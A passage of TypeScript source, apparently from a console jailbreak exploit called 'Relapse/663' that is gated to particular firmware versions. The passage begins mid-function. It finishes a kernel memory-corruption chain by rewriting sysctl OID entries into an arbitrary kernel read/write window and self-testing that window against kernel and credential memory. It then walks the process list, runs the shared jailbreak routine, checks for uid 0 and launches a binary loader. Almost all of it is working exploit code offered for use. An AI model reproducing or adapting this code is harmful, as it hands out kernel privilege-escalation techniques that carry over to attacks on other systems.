  // restore oid_number to 15 + unhide oid + apply caps plan (single arming)
  const curNum = (KERN_FILE_NUM - ONUM_N) >>> 0
  const delta = (curNum - KERN_FILE_NUM) >>> 0
  const pNum = {
    d: [delta & 0xff, (delta >>> 8) & 0xff, (delta >>> 16) & 0xff, (delta >>> 24) & 0xff]
  }
  {
    let i = 0
    const pos: number[] = []
    for (let j = 0; j < 4; j++) for (let q = 0; q < pNum.d[j]!; q++) pos.push(j)
    for (let j = 0; j < pos.length; j++) wnode(i++, O_NUM.add(pos[j]!), DUM, false)
    wnode(i++, O_VIS, DUM, false)
    for (let q = 0; q < capsPend; q++) wnode(i++, CAPS_B as BigInt, DUM, false)
    put64(arDv, (i - 1) * NODE_SZ + 0x30, BigInt_Zero)
    mark('KF-WRITE', 'restore_oid_number=' + pos.length + ' unhide=1 caps=' + capsPend + ' total=' + i)
    if (runChain(i, 'restore+unhide+caps') === null) {
      relapse_fail('KF restore chain failed', false)
      return
    }
    capsWrote = capsPend
  }
  mark('CAPS-DONE', 'wrote=' + capsWrote + ' armings=' + armCount)

  const after = kernFileCheck('after-unhide')
  const capsLive = after.rv === 0
  if (after.rv === 0) {
    // pull the kern.file list with buffer (validates the oid window is live)
    olDv.setInt32(0, KF_BYTES, true)
    olDv.setInt32(4, 0, true)
    const rb = sysctl(mibAd, 2, kfAd, olAd, BigInt_Zero, 0)
    mark('KF-SYSCTL', 'with-buffer rv=' + Number(rb.lo) + ' oldlen=' + olDv.getUint32(0, true))
  }

  // --- KRW setup ---
  const A_OID = (KBASE as BigInt).add(K_TABLE!.oid_maxfilesperproc)
  const A2_OID = (KBASE as BigInt).add(K_TABLE!.oid_maxprocperuid)
  const B_OID = (KBASE as BigInt).add(K_TABLE!.oid_maxfiles)
  const A_ARG1_CUR = (KBASE as BigInt).add(K_TABLE!.arg1_maxfilesperproc)
  const A2_ARG1_CUR = (KBASE as BigInt).add(K_TABLE!.arg1_maxprocperuid)
  const B_ARG1 = B_OID.add(0x18)
  mark('KRW-OIDS', 'A(1,27)=' + hex(A_OID) + ' A2(1,28)=' + hex(A2_OID) + ' B(1,7)=' + hex(B_OID) + ' capsLive=' + (capsLive ? 1 : 0))

  const planLow = function (cur: BigInt, tgt: BigInt): number[] | null {
    if (cur.hi >>> 0 !== tgt.hi >>> 0) return null
    const b: number[] = []
    for (let k = 0; k < 4; k++) b.push((cur.lo >>> (8 * k)) & 0xff)
    b.push(0, 0, 0, 0)
    const t: number[] = []
    for (let k = 0; k < 4; k++) t.push((tgt.lo >>> (8 * k)) & 0xff)
    const decwin = (j: number) => {
      let c = -1
      for (let k = 0; k < 4 && j + k < 8; k++) {
        let v = b[j + k]! + c
        if (v < 0) {
          v += 256
          c = -1
        } else c = 0
        b[j + k] = v
        if (c === 0) break
      }
    }
    const pos: number[] = []
    for (let j = 0; j < 4; j++) {
      const d = (b[j]! - t[j]!) & 0xff
      for (let q = 0; q < d; q++) {
        pos.push(j)
        decwin(j)
      }
    }
    const lowOk = b[0] === t[0] && b[1] === t[1] && b[2] === t[2] && b[3] === t[3]
    const hiClean = b[4] === 0 && b[5] === 0 && b[6] === 0 && b[7] === 0
    if (!lowOk || !hiClean || pos.length < 1 || pos.length > 4090) return null
    return pos
  }
  const posA = planLow(A_ARG1_CUR, B_ARG1)
  const posA2 = planLow(A2_ARG1_CUR, B_ARG1.add(4))
  mark('KRW-PLAN', 'posA=' + (posA ? posA.length : 'REFUSED') + ' posA2=' + (posA2 ? posA2.length : 'REFUSED'))
  const planOk = capsLive && !!posA && !!posA2
  if (!check('krw-plan-ok', planOk, 'capsLive=' + (capsLive ? 1 : 0))) {
    relapse_fail('krw plan', false)
    return
  }

  {
    let i = 0
    wnode(i++, A_OID.add(0x50), DUM, false)
    wnode(i++, A2_OID.add(0x50), DUM, false)
    wnode(i++, B_OID.add(0x50), DUM, false)
    for (let k = 0; k < posA!.length; k++) wnode(i++, A_OID.add(0x18 + posA![k]!), DUM, false)
    for (let k = 0; k < posA2!.length; k++) wnode(i++, A2_OID.add(0x18 + posA2![k]!), DUM, false)
    put64(arDv, (i - 1) * NODE_SZ + 0x30, BigInt_Zero)
    mark('KRW-FIRE', 'nodes=' + i + ' (3 unhide + ' + posA!.length + ' A + ' + posA2!.length + ' A2)')
    if (!check('krw-fire-bounded', i > 0 && i <= MAXN, 'nodes=' + i) || runChain(i, 'krw-setup') === null) {
      relapse_fail('krw-setup arming', false)
      return
    }
  }

  // --- KRW primitives (syscall-speed arbitrary kernel r/w via sysctl window)
  const kmLst = buf(8)
  const kmDv = kmLst.dv
  const kmAd = kmLst.ad
  const koLst = buf(4)
  const koDv = koLst.dv
  const koAd = koLst.ad
  const knLst = buf(4)
  const knDv = knLst.dv
  const knAd = knLst.ad
  const klLst = buf(8)
  const klDv = klLst.dv
  const klAd = klLst.ad

  const kMib = (a: number, b: number) => {
    kmDv.setInt32(0, a, true)
    kmDv.setInt32(4, b, true)
  }
  const kSysRead = function (a: number, b: number) {
    kMib(a, b)
    klDv.setInt32(0, 4, true)
    klDv.setInt32(4, 0, true)
    koDv.setInt32(0, 0, true)
    const r = sysctl(kmAd, 2, koAd, klAd, BigInt_Zero, 0)
    const rv = Number(r.lo) | 0
    const er = rv < 0 ? relapse_errno() : 0
    const vl = koDv.getInt32(0, true)
    return { rv, err: er, val: vl }
  }
  const kSysWrite = function (a: number, b: number, v: number) {
    kMib(a, b)
    knDv.setInt32(0, v | 0, true)
    const r = sysctl(kmAd, 2, BigInt_Zero, BigInt_Zero, knAd, 4)
    const rv = Number(r.lo) | 0
    const er = rv < 0 ? relapse_errno() : 0
    return { rv, err: er }
  }
  let stLo = 0
  let stHi = 0
  let stOK = false
  const steer = (X: BigInt) => {
    const lo = X.lo | 0
    const hi = X.hi | 0
    if (stOK && stLo === lo && stHi === hi) return
    const w1 = kSysWrite(1, 27, lo)
    const w2 = kSysWrite(1, 28, hi)
    stOK = w1.rv === 0 && w2.rv === 0
    if (stOK) {
      stLo = lo
      stHi = hi
    }
  }
  const kread32 = (X: BigInt): number => {
    steer(X)
    return kSysRead(1, 7).val >>> 0
  }
  const kwrite32 = (X: BigInt, v: number): number => {
    steer(X)
    return kSysWrite(1, 7, v | 0).rv
  }
  const read8k = (X: BigInt): BigInt => {
    const lo = kread32(X)
    const hi = kread32(X.add(4))
    return new BigInt(hi >>> 0, lo >>> 0)
  }
  const write8k = (X: BigInt, V: BigInt) => {
    kwrite32(X, V.lo | 0)
    kwrite32(X.add(4), V.hi | 0)
  }

  // --- Self-tests ---
  const t1 = kread32(A_OID.add(0x10))
  check('krw-read32-image', t1 === 27, '*(A_oid+0x10)=' + t1 + ' want=27')
  const t2 = read8k(A_OID.add(0x10))
  const t2ok = (t2.lo >>> 0) === 27 && (t2.hi >>> 0) === 0xc0040002
  check('krw-read8-image', t2ok, 'got lo=0x' + (t2.lo >>> 0).toString(16) + ' hi=0x' + (t2.hi >>> 0).toString(16))
  const uidNow = Number(getuid().lo) >>> 0
  const t3 = kread32((UCRED as BigInt).add(0x04))
  check('krw-read32-heap', t3 === uidNow, 'cr_uid=' + t3 + ' getuid=' + uidNow)
  const SCR4 = (KBASE as BigInt).add(K_TABLE!.arg1_maxfiles)
  const o4 = kread32(SCR4)
  kwrite32(SCR4, 0x41424344)
  const r4 = kread32(SCR4)
  kwrite32(SCR4, o4 | 0)
  const b4 = kread32(SCR4)
  check('krw-write32', r4 === 0x41424344 && b4 === o4, 'readback=0x' + r4.toString(16) + ' restored=' + b4)
  const SCR8 = (KBASE as BigInt).add(K_TABLE!.oid_maxfiles + 0x20)
  const o8 = read8k(SCR8)
  const MAGIC8 = new BigInt(0x11223344, 0xdeadbeef)
  write8k(SCR8, MAGIC8)
  const r8 = read8k(SCR8)
  write8k(SCR8, o8)
  const b8 = read8k(SCR8)
  const t5ok = (r8.lo >>> 0) === 0xdeadbeef && (r8.hi >>> 0) === 0x11223344 && (b8.lo >>> 0) === (o8.lo >>> 0) && (b8.hi >>> 0) === (o8.hi >>> 0)
  check('krw-write64', t5ok, 'orig=' + hex(o8) + ' restored=' + hex(b8))

  const krwOk = t1 === 27 && t2ok && t3 === uidNow && r4 === 0x41424344 && t5ok
  mark('KRW-VERDICT', 'fw=' + FW_VERSION + ' kernel_base=' + hex(KBASE as BigInt) + ' krwOk=' + (krwOk ? 1 : 0) + ' armings=' + armCount)
  if (!krwOk) {
    relapse_fail('krw self-tests', false)
    return
  }

  // --- Assign the kernel API used by jailbreak_shared / payloads ---
  kernel.addr.base = KBASE as BigInt
  try { jsmaf.kbase = KBASE as BigInt } catch (e) { /* optional */ }
  kernel.read_buffer = function (kaddr: BigInt, length: number): Uint8Array | null {
    if (length < 0 || length > (1 << 20)) return null
    const out = new Uint8Array(length)
    let off = 0
    while (off < length) {
      let take = length - off
      if (take > 4) take = 4
      const v = kread32(kaddr.add(off))
      for (let by = 0; by < take; by++) {
        out[off + by] = (v >>> (8 * by)) & 0xff
      }
      off += take
    }
    return out
  }
  kernel.write_buffer = function (kaddr: BigInt, buffer: Uint8Array) {
    let off = 0
    while (off < buffer.length) {
      let take = buffer.length - off
      if (take > 4) take = 4
      let word = 0
      for (let by = 0; by < take; by++) {
        word |= (buffer[off + by]! << (8 * by))
      }
      kwrite32(kaddr.add(off), word | 0)
      off += take
    }
  }
  kernel.read_qword = function (kaddr: BigInt) {
    const lo = kread32(kaddr)
    const hi = kread32(kaddr.add(4))
    return new BigInt(hi >>> 0, lo >>> 0)
  }
  kernel.write_qword = function (dest: BigInt, value: BigInt | number) {
    const v = value instanceof BigInt ? value : new BigInt(value)
    kwrite32(dest, v.lo | 0)
    kwrite32(dest.add(4), v.hi | 0)
  }
  kernel.write_dword = function (dest: BigInt, value: number) {
    kwrite32(dest, value | 0)
  }

  // curproc / allproc via curthread (polpNO: TD_PROC=0x8, P_UCRED=0x40, P_FD=0x48)
  const curproc = read8k((CT1 as BigInt).add(TD_PROC))
  kernel.addr.curproc = curproc
  const pid = Number(getpid().lo) >>> 0
  const PROC_LIST = 0x08
  let p = curproc
  let walk_count = 0
  const term = new BigInt(0xFFFFFFFF, 0x00000000)
  while (!(p.and(term)).eq(term) && walk_count < 10000) {
    p = read8k(p.add(PROC_LIST))
    walk_count++
  }
  kernel.addr.allproc = p
  mark('KRW-API', 'curproc=' + hex(curproc) + ' pid=' + pid + ' allproc=' + hex(p) + ' walks=' + walk_count)

  yield_to_render(relapse_jailbreak)
}

// ---------------------------------------------------------------------------
// PHASE 5: jailbreak + finish
// ---------------------------------------------------------------------------
function relapse_jailbreak () {
  try {
    jailbreak_shared(FW_VERSION as string)
  } catch (e) {
    relapse_fail('jailbreak_shared: ' + (e as Error).message, false)
    return
  }
  const uid = Number(getuid().lo) >>> 0
  mark('KJ-OK', 'getuid=' + uid + ' kernel_base=' + hex(KBASE as BigInt) + ' armings=' + armCount)
  if (uid !== 0) {
    relapse_fail('uid nonzero after jailbreak', false)
    return
  }
  try {
    utils.notify('Relapse/663 finished OK\nEnjoy the 663 relay')
  } catch (e) { /* notify optional */ }
  cleanup(true)
  show_success()
  run_binloader()
}

// ---------------------------------------------------------------------------
// Public entry
// ---------------------------------------------------------------------------
function relapse_fwcheck () {
  const fw = get_fwversion()
  if (fw === null) {
    mark('FW-FAIL', 'get_fwversion failed')
    return false
  }
  FW_VERSION = fw
  const tab = RELAPSE_K[fw]
  if (!tab) {
    mark('FW-NO-TABLE', 'fw=' + fw + ' -> relapse covers 12.50/12.52/13.00/13.02/13.04 only; 12.02 and below run lapse')
    return false
  }
  K_TABLE = tab
  idt_alt = (fw === '12.50' || fw === '12.52') ? 0x1c1d40 : null
  const off = get_kernel_offset(fw)
  if (!off || typeof off.PRISON0 !== 'number') {
    mark('KERNEL-OFFSET-FAIL', 'jailbreak_shared offsets unavailable for fw=' + fw)
    return false
  }
  return true
}

export function relapse () {
  if (relapse_dead) {
    log('[relapse] refusing to re-run after final failure')
    return
  }
  relapse_tries++
  mark('START', 'try ' + relapse_tries + '/' + MAX_RETRIES)
  if (!relapse_fwcheck()) {
    relapse_fail('fw gate', false)
    return
  }
  try {
    utils.notify('FW ' + FW_VERSION + ' Detected! Relapse/663' + (idt_alt !== null ? ' (experimental)' : ''))
  } catch (e) { /* optional */ }
  relapse_setup()
}
